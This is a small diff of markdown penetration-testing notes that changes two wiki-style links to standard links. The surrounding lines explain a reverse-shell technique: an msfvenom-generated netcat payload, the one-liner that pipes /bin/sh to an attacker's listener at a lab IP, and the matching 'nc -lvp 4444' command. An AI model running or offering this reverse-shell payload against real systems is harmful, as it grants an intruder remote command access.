@@ -33,7 +33,7 @@ netstat -an
 Aim is for the Target to build a Connection to myself
 
 
-**[[msfvenom]]** => creates and encodes a netcat reverse Shell (create an payload Command which has to run on the Target)
+**[msfvenom](msfvenom)** => creates and encodes a netcat reverse Shell (create an payload Command which has to run on the Target)
 
 Create a Payload on the local Machine:
 
@@ -43,7 +43,7 @@ Output:
 
 `mkfifo /tmp/pshz; nc 10.10.192.24 4444 0</tmp/pshz | /bin/sh >/tmp/pshz 2>&1; rm /tmp/pshz`
 
-Start a [[netcat]] Listener on the Local Machine:
+Start a [netcat](netcat) Listener on the Local Machine:
 
 `nc -lvp 4444`
 
